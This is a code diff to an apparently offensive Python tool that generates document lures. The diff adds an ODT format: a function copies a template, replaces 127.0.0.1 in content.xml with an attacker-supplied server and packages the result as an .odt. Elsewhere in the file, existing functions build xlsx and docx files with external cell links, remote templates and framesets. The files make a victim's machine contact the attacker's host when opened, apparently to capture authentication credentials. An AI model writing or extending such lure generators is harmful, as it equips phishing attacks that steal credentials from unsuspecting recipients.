@@ -53,6 +53,7 @@ parser.add_argument('-g', '--generate',
 		"htm",
 		"docx",
 		"xlsx",
+		"odt",
 		"wax",		
 		"m3u",
 		"asx",
@@ -235,6 +236,31 @@ def create_xlsx_externalcell(generate,server,filename):
 	worksheet = workbook.add_worksheet()
 	worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
 	workbook.close()
+	print("Created: " + filename + " (OPEN)")
+
+# .odt file with cell based attack
+def create_odt_externalcell(generate,server,filename):
+	# Source path
+	src = os.path.join("templates", "odt-template")
+	# Destination path
+	dest = os.path.join("odt-remotetemplate-template")
+	# Copy the content of
+	# source to destination
+	shutil.copytree(src, dest)
+	documentfilename = os.path.join("odt-remotetemplate-template", "content.xml")
+	# Read the template file
+	file = open(documentfilename, 'r')
+	filedata = file.read()
+	file.close()
+	# Replace the target string
+	filedata = filedata.replace('127.0.0.1', server)
+	# Write the file out again
+	file = open(documentfilename, 'w')
+	file.write(filedata)
+	file.close()
+	shutil.make_archive(filename, 'zip', "odt-remotetemplate-template")
+	os.rename(filename + ".zip", filename)
+	shutil.rmtree("odt-remotetemplate-template")
 	print("Created: " + filename + " (OPEN)")
 
 # .wax remote playlist attack
@@ -497,6 +523,9 @@ elif(args.generate == "docx"):
 	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
 	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
 	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))
+
+elif(args.generate == "odt"):
+	create_odt_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).odt"))
 
 elif(args.generate == "xlsx"):
 	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
